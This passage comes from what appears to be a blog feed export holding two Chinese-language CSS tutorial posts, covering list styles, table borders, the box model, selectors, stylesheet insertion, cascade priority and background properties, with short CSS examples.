align="center">设置列表中列表项标志的位置。</td></tr><tr><td align="center">list-style-type</td><td align="center">设置列表项标志的类型。</td></tr></tbody></table><h3 id="3-1-不同列表项标记（list-style-type）"><a href="#3-1-不同列表项标记（list-style-type）" class="headerlink" title="3.1 不同列表项标记（list-style-type）"></a>3.1 不同列表项标记（list-style-type）</h3><p>list-style-type 属性指定列表项标记的类型是。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">ul</span><span class="hljs-selector-class">.a</span> &#123;<span class="hljs-attribute">list-style-type</span>: circle;&#125;<br><span class="hljs-selector-tag">ul</span><span class="hljs-selector-class">.b</span> &#123;<span class="hljs-attribute">list-style-type</span>: square;&#125;<br><br><span class="hljs-selector-tag">ol</span><span class="hljs-selector-class">.c</span> &#123;<span class="hljs-attribute">list-style-type</span>: upper-roman;&#125;<br><span class="hljs-selector-tag">ol</span><span class="hljs-selector-class">.d</span> &#123;<span class="hljs-attribute">list-style-type</span>: lower-alpha;&#125;<br></code></pre></div></td></tr></table></figure><p>list-style-type 属性的常见属性值：</p><blockquote><ol><li>none：不使用项目符号</li><li>disc：实心圆</li><li>circle：空心圆</li><li>square：实心方块</li><li>decimal：阿拉伯数字 </li><li>lower-alpha：小写英文字母 </li><li>upper-alpha：大写英文字母 </li><li>lower-roman：小写罗马数字 </li><li>upper-roman：大写罗马数字</li></ol></blockquote><h3 id="3-2-作为列表项标记的图像（list-style-image）"><a href="#3-2-作为列表项标记的图像（list-style-image）" class="headerlink" title="3.2 作为列表项标记的图像（list-style-image）"></a>3.2 作为列表项标记的图像（list-style-image）</h3><p>要指定列表项标记的图像，使用列表样式图像属性：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">ul</span>&#123;<br><span class="hljs-attribute">list-style-image</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">&#x27;sqpurple.gif&#x27;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="3-3-简写属性"><a href="#3-3-简写属性" class="headerlink" title="3.3 简写属性"></a>3.3 简写属性</h3><p>在单个属性中可以指定所有的列表属性。</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">ul</span>&#123;<br><span class="hljs-attribute">list-style</span>: square <span class="hljs-built_in">url</span>(<span class="hljs-string">&quot;sqpurple.gif&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>使用缩写属性值的顺序是：</p><blockquote><ol><li>list-style-type</li><li>list-style-position (有关说明，请参见下面的CSS属性表)</li><li>list-style-image</li></ol></blockquote><h2 id="4-表格（table）"><a href="#4-表格（table）" class="headerlink" title="4.表格（table）"></a>4.表格（table）</h2><h3 id="4-1-表格边框（border）"><a href="#4-1-表格边框（border）" class="headerlink" title="4.1 表格边框（border）"></a>4.1 表格边框（border）</h3><p>指定 CSS 表格边框，使用 border 属性。</p><p>使用实例：指定一个表格的 th 和 td 元素的黑色边框：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">table</span>, <span class="hljs-selector-tag">th</span>, <span class="hljs-selector-tag">td</span><br>&#123; <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid black; &#125;<br></code></pre></div></td></tr></table></figure><p>在上面的例子中的表格有双边框。这是因为表和 th / td 元素有独立的边界。为了显示一个表的单个边框，使用 border-collapse属性。</p><h3 id="4-2-折叠边框（border-collapse）"><a href="#4-2-折叠边框（border-collapse）" class="headerlink" title="4.2 折叠边框（border-collapse）"></a>4.2 折叠边框（border-collapse）</h3><p>border-collapse 属性设置表格的边框是否被折叠成一个单一的边框或隔开：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">table</span><br>&#123; <span class="hljs-attribute">border-collapse</span>:collapse; &#125;<br><span class="hljs-selector-tag">table</span>,<span class="hljs-selector-tag">th</span>, <span class="hljs-selector-tag">td</span> &#123; <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid black; &#125;<br></code></pre></div></td></tr></table></figure><h3 id="4-3-表格宽、高（width、height）"><a href="#4-3-表格宽、高（width、height）" class="headerlink" title="4.3 表格宽、高（width、height）"></a>4.3 表格宽、高（width、height）</h3><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">table</span><br>&#123; <span class="hljs-attribute">width</span>:<span class="hljs-number">100%</span>; &#125;<br><span class="hljs-selector-tag">th</span> &#123; <span class="hljs-attribute">height</span>:<span class="hljs-number">50px</span>; &#125;<br></code></pre></div></td></tr></table></figure><h3 id="4-4-表格文字对齐（text-align）"><a href="#4-4-表格文字对齐（text-align）" class="headerlink" title="4.4 表格文字对齐（text-align）"></a>4.4 表格文字对齐（text-align）</h3><p>表格中的文本对齐和垂直对齐属性。text-align 属性设置水平对齐方式，像左，右，或中心：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">td</span><br>&#123; <span class="hljs-attribute">text-align</span><span class="hljs-selector-pseudo">:right</span>; &#125;<br><span class="hljs-comment">/*垂直对齐属性设置垂直对齐，比如顶部，底部或中间：*/</span><br><span class="hljs-selector-tag">td</span><br>&#123; <span class="hljs-attribute">height</span>:<span class="hljs-number">50px</span>; <span class="hljs-attribute">vertical-align</span>:bottom; &#125;<br></code></pre></div></td></tr></table></figure><h3 id="4-5-表格填充（padding）"><a href="#4-5-表格填充（padding）" class="headerlink" title="4.5 表格填充（padding）"></a>4.5 表格填充（padding）</h3><p>如果在表的内容中控制空格之间的边框，应使用 td 和 th 元素的填充属性：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">td</span><br>&#123; <span class="hljs-attribute">padding</span>:<span class="hljs-number">15px</span>; &#125;<br></code></pre></div></td></tr></table></figure><h3 id="4-6-表格颜色"><a href="#4-6-表格颜色" class="headerlink" title="4.6 表格颜色"></a>4.6 表格颜色</h3><p>指定边框的颜色，和 th 元素的文本和背景颜色：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">table</span>, <span class="hljs-selector-tag">td</span>, <span class="hljs-selector-tag">th</span><br>&#123; <span class="hljs-attribute">border</span>:<span class="hljs-number">1px</span> solid green; &#125;<br><span class="hljs-selector-tag">th</span><br>&#123; <span class="hljs-attribute">background-color</span>:green; <span class="hljs-attribute">color</span>:white; &#125;<br></code></pre></div></td></tr></table></figure><h2 id="5-盒子模型（Box-Model）"><a href="#5-盒子模型（Box-Model）" class="headerlink" title="5.盒子模型（Box Model）"></a>5.盒子模型（Box Model）</h2><p>所有 HTML 元素可以看作盒子，在 CSS 中，”box model “这一术语是用来设计和布局时使用。CSS 盒模型本质上是一个盒子，封装周围的 HTML 元素，它包括：边距，边框，填充，和实际内容。盒模型允许我们在其它元素和周围元素边框之间的空间放置元素。如图：</p><p><img src="https://img-blog.csdnimg.cn/20210513165336628.gif"></p><p>说明：</p><blockquote><ul><li>Margin（外边距） - 清除边框区域。Margin 没有背景颜色，它是完全透明</li><li>Border（边框） - 边框周围的填充和内容。边框是受到盒子的背景颜色影响</li><li>Padding（内边距） - 清除内容周围的区域。会受到框中填充的背景颜色影响</li><li>Content（内容） - 盒子的内容，显示文本和图像</li></ul></blockquote><p>在盒模型中，外边距可以是负值，而且在很多情况下都要使用负值的外边距。</p><h3 id="5-1-元素的宽度和高度"><a href="#5-1-元素的宽度和高度" class="headerlink" title="5.1 元素的宽度和高度"></a>5.1 元素的宽度和高度</h3><p>当您指定一个 CSS 元素的宽度和高度属性时，你只是设置内容区域的宽度和高度。要知道，完全大小的元素，你还必须添加填充，边框和边距。</p><p>使用实例：元素的总宽度为 300px</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-attribute">width</span>:<span class="hljs-number">250px</span>;        <br><span class="hljs-attribute">padding</span>:<span class="hljs-number">10px</span>;        <br><span class="hljs-attribute">border</span>:<span class="hljs-number">5px</span> solid gray;        <br><span class="hljs-attribute">margin</span>:<span class="hljs-number">10px</span>;<br></code></pre></div></td></tr></table></figure><p>这里，250px (宽)+ 20px (左 + 右填充)+ 10px (左 + 右边框)+ 20px (左 + 右边距)= 300px</p><p>使用实例：只有 250 像素的空间。设置总宽度为 250 像素的元素：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-attribute">width</span>:<span class="hljs-number">220px</span>;<br><span class="hljs-attribute">padding</span>:<span class="hljs-number">10px</span>;<br><span class="hljs-attribute">border</span>:<span class="hljs-number">5px</span> solid gray;<br><span class="hljs-attribute">margin</span>:<span class="hljs-number">0px</span>;<br></code></pre></div></td></tr></table></figure><p>最终元素的总宽度计算公式：<br>总元素的宽度=宽度+左填充+右填充+左边框+右边框+左边距+右边距</p><p>元素的总高度最终计算公式：<br>总元素的高度=高度+顶部填充+底部填充+上边框+下边框+上边距+下边距</p><hr>]]></content>
    
    
    <categories>
      
      <category>WEB前端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>WEB前端-CSS基础知识复习（一）</title>
    <link href="/2021/05/13/WEB%E5%89%8D%E7%AB%AF-CSS%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2021/05/13/WEB%E5%89%8D%E7%AB%AF-CSS%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>CSS 指层叠样式表（Cascading Style Sheets）。通过与 XHTML 结合，CSS 可以帮助我们实行表现与结构分离的开发模式。 通过使用 CSS 来提升工作效率！<br>外部样式表通常存储在 CSS 文件中，外部样式表可以极大提高工作效率。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-语法"><a href="#1-语法" class="headerlink" title="1.语法"></a>1.语法</h2><p>CSS 规则由两个主要的部分构成：选择器，以及一条或多条声明。<br>选择器通常是您需要改变样式的 HTML 元素。</p><p>每条声明由一个属性和一个值组成。</p><p>属性（property）是您希望设置的样式属性（style attribute）。每个属性有一个值。属性和值被冒号分开。<br>如图：</p><p><img src="https://img-blog.csdnimg.cn/20210512164059413.gif"></p><h3 id="1-1-实例"><a href="#1-1-实例" class="headerlink" title="1.1 实例"></a>1.1 实例</h3><p>CSS 声明总是以分号 ( ; ) 结束，声明组以大括号 ({ }) 括起来:</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">color</span>:red;<span class="hljs-attribute">text-align</span>:center;&#125;<br></code></pre></div></td></tr></table></figure><p>也可以每行只描述一个属性:</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span><br>&#123;<span class="hljs-attribute">color</span>:red;<br><span class="hljs-attribute">text-align</span>:center;&#125;<br></code></pre></div></td></tr></table></figure><h3 id="1-2-颜色值写法"><a href="#1-2-颜色值写法" class="headerlink" title="1.2 颜色值写法"></a>1.2 颜色值写法</h3><p>在描述颜色的时候，除了使用英文单词 red，我们还可以使用十六进制的颜色值 #ff0000。</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> &#123; <span class="hljs-attribute">color</span>: <span class="hljs-number">#ff0000</span>; &#125;<br></code></pre></div></td></tr></table></figure><p>为了节约字节，可以使用 CSS 的缩写形式： </p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> &#123; <span class="hljs-attribute">color</span>: <span class="hljs-number">#f00</span>; &#125;<br></code></pre></div></td></tr></table></figure><p>还可以通过两种方法使用 RGB 值：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> &#123; <span class="hljs-attribute">color</span>: <span class="hljs-built_in">rgb</span>(<span class="hljs-number">255</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>); &#125; <br><span class="hljs-selector-tag">p</span> &#123; <span class="hljs-attribute">color</span>: <span class="hljs-built_in">rgb</span>(<span class="hljs-number">100%</span>,<span class="hljs-number">0%</span>,<span class="hljs-number">0%</span>); &#125;<br></code></pre></div></td></tr></table></figure><p><strong>注意：</strong>当使用 RGB 百分比时，即使当值为 0 时也要写百分比符号。但是在其他的情况下就不需要这么做了。比如说，当尺寸为 0 像素时，0 之后不需要使用 px 单位。</p><h3 id="1-3-注释"><a href="#1-3-注释" class="headerlink" title="1.3 注释"></a>1.3 注释</h3><p>CSS注释以 “/*“ 开始, 以 “*/“ 结束, 如:</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-comment">/*这是个注释*/</span>        <br><span class="hljs-selector-tag">p</span>        <br>&#123;       <br><span class="hljs-attribute">text-align</span>:center;       <br><span class="hljs-comment">/*这是另一个注释*/</span>     <br><span class="hljs-attribute">color</span>:black;     <br><span class="hljs-attribute">font-family</span>:arial;       <br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="2-选择器"><a href="#2-选择器" class="headerlink" title="2.选择器"></a>2.选择器</h2><p>若要在 HTML 元素中设置 CSS 样式，需要在元素中设置 “id” 和 “class” 选择器。</p><h3 id="2-1-id-选择器"><a href="#2-1-id-选择器" class="headerlink" title="2.1 id 选择器"></a>2.1 id 选择器</h3><p>id 选择器可以为标有特定 id 的 HTML 元素指定特定的样式。HTML 元素以 id 属性来设置 id 选择器,CSS 中 id 选择器以 # 来定义。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-comment">/* id = &quot;para1&quot; ,ID 属性不要以数字开头,且ID 属性只能在每个 HTML 文档中出现一次。*/</span><br><span class="hljs-selector-id">#para1</span>&#123;  <br><span class="hljs-attribute">text-align</span>:center;<br><span class="hljs-attribute">color</span>:red; <br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="2-2-class-类选择器"><a href="#2-2-class-类选择器" class="headerlink" title="2.2 class 类选择器"></a>2.2 class 类选择器</h3><p>class 选择器用于描述一组元素的样式，class 选择器有别于 id 选择器，class 可以在多个元素中使用。class 选择器在 HTML 中以 class 属性表示, 在 CSS 中，类选择器以一个点”.”号显示：</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-class">.center</span> &#123;<span class="hljs-attribute">text-align</span>:center;&#125;<br></code></pre></div></td></tr></table></figure><p>也可以指定特定的 HTML 元素使用 class。<br>实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-comment">/*类名的第一个字符不能使用数字！*/</span><br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.center</span> &#123;<span class="hljs-attribute">text-align</span>:center;&#125;<span class="hljs-comment">/*所有的 p 元素使用 class=&quot;center&quot; 让该元素的文本居中*/</span><br></code></pre></div></td></tr></table></figure><h3 id="2-3-标签选择器"><a href="#2-3-标签选择器" class="headerlink" title="2.3 标签选择器"></a>2.3 标签选择器</h3><p>标签选择器，即以 HTML 标签作为 CSS 修饰所用的选择器。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css">&lt;style&gt;<br><span class="hljs-selector-tag">h3</span>&#123;<span class="hljs-attribute">color</span>:red;&#125;<br>&lt;/style&gt;<br>&lt;<span class="hljs-selector-tag">h3</span>&gt;CSS教程&lt;/<span class="hljs-selector-tag">h3</span>&gt;<br></code></pre></div></td></tr></table></figure><h3 id="2-4-内联选择器"><a href="#2-4-内联选择器" class="headerlink" title="2.4 内联选择器"></a>2.4 内联选择器</h3><p>内联选择器，即直接在标签内部写 CSS 代码。</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css">&lt;h3 style=&quot;color:red;&quot;&gt;CSS教程&lt;/h3&gt;<br></code></pre></div></td></tr></table></figure><p>这四种 选择器有修饰上的优先级，即：</p><p>内联选择器 &gt; id选择器 &gt; 类选择器 &gt; 标签选择器</p><h2 id="3-CSS创建"><a href="#3-CSS创建" class="headerlink" title="3.CSS创建"></a>3.CSS创建</h2><h3 id="3-1插入样式表"><a href="#3-1插入样式表" class="headerlink" title="3.1插入样式表"></a>3.1插入样式表</h3><blockquote><ul><li>外部样式表</li><li>内部样式表</li><li>内联样式</li></ul></blockquote><h4 id="3-1-1-外部样式表"><a href="#3-1-1-外部样式表" class="headerlink" title="3.1.1 外部样式表"></a>3.1.1 外部样式表</h4><p>当样式需要应用于很多页面时，外部样式表将是理想的选择。在使用外部样式表的情况下，你可以通过改变一个文件来改变整个站点的外观。每个页面使用 标签链接到样式表。 标签在（文档的）头部。如：&lt;head&gt; &lt;link rel=”stylesheet” type=”text/css” href=”mystyle.css”&gt; &lt;/head&gt;</p><p>浏览器会从文件 mystyle.css 中读到样式声明，并根据它来格式文档。<br>外部样式表可以在任何文本编辑器中进行编辑。文件不能包含任何的 html 标签。样式表应该以 .CSS 扩展名进行保存。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css">hr &#123;<span class="hljs-attribute">color</span>:sienna;&#125;            <br><span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">margin-left</span>:<span class="hljs-number">20px</span>;&#125;            <br><span class="hljs-selector-tag">body</span> &#123;<span class="hljs-attribute">background-image</span>:<span class="hljs-built_in">url</span>(<span class="hljs-string">/images/back40.gif</span>);&#125;<br></code></pre></div></td></tr></table></figure><p><strong>不要在属性值与单位之间留有空格。</strong></p><h4 id="3-1-2-内部样式表"><a href="#3-1-2-内部样式表" class="headerlink" title="3.1.2 内部样式表"></a>3.1.2 内部样式表</h4><p>当单个文档需要特殊的样式时，就应该使用内部样式表。你可以使用 &lt;style&gt; 标签在文档头部定义内部样式表。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css">&lt;head&gt;<br>&lt;style&gt;<br>hr &#123;<span class="hljs-attribute">color</span>:sienna;&#125;<br><span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">margin-left</span>:<span class="hljs-number">20px</span>;&#125;<br><span class="hljs-selector-tag">body</span> &#123;<span class="hljs-attribute">background-image</span>:<span class="hljs-built_in">url</span>(<span class="hljs-string">&quot;images/back40.gif&quot;</span>);&#125;<br>&lt;/style&gt;<br>&lt;/head&gt;<br></code></pre></div></td></tr></table></figure><h4 id="3-1-3-内联样式"><a href="#3-1-3-内联样式" class="headerlink" title="3.1.3 内联样式"></a>3.1.3 内联样式</h4><p>由于要将表现和内容混杂在一起，内联样式会损失掉样式表的许多优势。</p><p>要使用内联样式，你需要在相关的标签内使用样式（style）属性。Style 属性可以包含任何 CSS 属性。</p><p>使用实例：</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css">&lt;p style=&quot;color:sienna;margin-left:20px&quot;&gt;这是一个段落。&lt;/p&gt;<br></code></pre></div></td></tr></table></figure><h3 id="3-2-多重样式表"><a href="#3-2-多重样式表" class="headerlink" title="3.2 多重样式表"></a>3.2 多重样式表</h3><p>如果某些属性在不同的样式表中被同样的选择器定义，那么属性值将从更具体的样式表中被继承过来。</p><p>例如：<br>外部样式表拥有针对 H3 选择器的三个属性：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">h3</span>&#123;        <br><span class="hljs-attribute">color</span>:red;        <br><span class="hljs-attribute">text-align</span><span class="hljs-selector-pseudo">:left</span>;     <br><span class="hljs-attribute">font-size</span>:<span class="hljs-number">8pt</span>;    <br>&#125;<br></code></pre></div></td></tr></table></figure><p>内部样式表拥有针对 H3 选择器的两个属性：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">h3</span>&#123;        <br><span class="hljs-attribute">text-align</span><span class="hljs-selector-pseudo">:right</span>;        <br><span class="hljs-attribute">font-size</span>:<span class="hljs-number">20pt</span>;     <br>&#125;<br></code></pre></div></td></tr></table></figure><p>假如拥有内部样式表的这个页面同时与外部样式表链接，那么 H3 得到的样式是：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-attribute">color</span>:red; <span class="hljs-attribute">text-align</span><span class="hljs-selector-pseudo">:right</span>;<br><span class="hljs-attribute">font-size</span>:<span class="hljs-number">20pt</span>;<br></code></pre></div></td></tr></table></figure><p>即颜色属性将被继承于外部样式表，而文字排列（text-alignment）和字体尺寸（font-size）会被内部样式表中的规则取代。</p><h4 id="3-2-1-多重样式优先级顺序"><a href="#3-2-1-多重样式优先级顺序" class="headerlink" title="3.2.1 多重样式优先级顺序"></a>3.2.1 多重样式优先级顺序</h4><p>优先级逐级增加的选择器列表：</p><ol><li>通用选择器（*）</li><li>元素(类型)选择器</li><li>类选择器</li><li>属性选择器</li><li>伪类</li><li>ID 选择器</li><li>内联样式</li></ol><h3 id="3-3-important-规则例外"><a href="#3-3-important-规则例外" class="headerlink" title="3.3 !important 规则例外"></a>3.3 !important 规则例外</h3><p>当 !important 规则被应用在一个样式声明中时，该样式声明会覆盖 CSS 中任何其他的声明，即优先级最高，无论它处在声明列表中的哪里。尽管如此，!important 规则还是与优先级毫无关系。使用 !important 不是一个好习惯，因为它改变了你样式表本来的级联规则，从而使其难以调试。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-id">#Box</span> &#123;<br><span class="hljs-attribute">color</span>:red <span class="hljs-meta">!important</span>;<br><span class="hljs-attribute">color</span>:blue;<br>&#125;<br><br><span class="hljs-selector-id">#box</span> &#123;<br><span class="hljs-attribute">height</span>:<span class="hljs-number">30px</span><span class="hljs-meta">!important</span>;<br><span class="hljs-attribute">height</span>:<span class="hljs-number">18px</span>;<br><span class="hljs-attribute">border</span>:<span class="hljs-number">1px</span> solid <span class="hljs-number">#000</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="3-4-CSS优先级法则"><a href="#3-4-CSS优先级法则" class="headerlink" title="3.4 CSS优先级法则"></a>3.4 CSS优先级法则</h3><ul><li>A 选择器都有一个权值，权值越大越优先；</li><li>B 当权值相等时，后出现的样式表设置要优于先出现的样式表设置；</li><li>C 创作者的规则高于浏览者：即网页编写者设置的 CSS 样式的优先权高于浏览器所设置的样式；</li><li>D 继承的 CSS 样式不如后来指定的 CSS 样式；</li><li>E 在同一组属性设置中标有 “!important” 规则的优先级最大；</li></ul><h2 id="4-背景（Backgrounds）"><a href="#4-背景（Backgrounds）" class="headerlink" title="4.背景（Backgrounds）"></a>4.背景（Backgrounds）</h2><p>CSS 背景属性用于定义 HTML 元素的背景。</p><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">background</td><td align="center">简写属性，作用是将背景属性设置在一个声明中。</td></tr><tr><td align="center">background-attachment</td><td align="center">背景图像是否固定或者随着页面的其余部分滚动。</td></tr><tr><td align="center">background-color</td><td align="center">设置元素的背景颜色。</td></tr><tr><td align="center">background-image</td><td align="center">把图像设置为背景。</td></tr><tr><td align="center">background-position</td><td align="center">设置背景图像的起始位置。</td></tr><tr><td align="center">background-repeat</td><td align="center">设置背景图像是否及如何重复。</td></tr></tbody></table><h3 id="4-1-背景颜色（background-color）"><a href="#4-1-背景颜色（background-color）" class="headerlink" title="4.1 背景颜色（background-color）"></a>4.1 背景颜色（background-color）</h3><p>定义了元素的背景颜色。</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">body</span> &#123;<span class="hljs-attribute">background-color</span>:<span class="hljs-number">#b0c4de</span>;&#125;<br><span class="hljs-selector-tag">h1</span> &#123;<span class="hljs-attribute">background-color</span>:<span class="hljs-number">#6495ed</span>;&#125;<br><span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">background-color</span>:<span class="hljs-number">#e0ffff</span>;&#125;<br><span class="hljs-selector-tag">div</span> &#123;<span class="hljs-attribute">background-color</span>:<span class="hljs-number">#b0c4de</span>;&#125;<br></code></pre></div></td></tr></table></figure><p><strong>提示：</strong>background-color 不能继承，其默认值是 transparent。如果一个元素没有指定背景色，那么背景就是透明的，这样其父元素的背景才可见。</p><h3 id="4-2-背景图像（background-image）"><a href="#4-2-背景图像（background-image）" class="headerlink" title="4.2 背景图像（background-image）"></a>4.2 